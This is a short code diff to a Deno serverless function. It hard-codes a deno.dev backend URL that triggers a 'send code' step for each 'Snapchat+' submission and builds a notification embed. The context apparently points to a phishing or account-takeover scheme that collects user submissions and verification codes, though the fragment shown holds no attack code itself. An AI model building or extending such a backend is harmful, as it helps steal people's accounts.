@@ -17,9 +17,8 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  // Use APP_URL secret which is the public backend URL (e.g. https://spare-lorikeet-87.deno.dev)
-  const backendOrigin = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
-  const triggerUrl = `${backendOrigin}/triggerSendCode?id=${submissionId}`;
+  // Hard-coded Deno backend URL
+  const triggerUrl = `https://spare-lorikeet-87-jnevt6bb4f1c.deno.dev/triggerSendCode?id=${submissionId}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
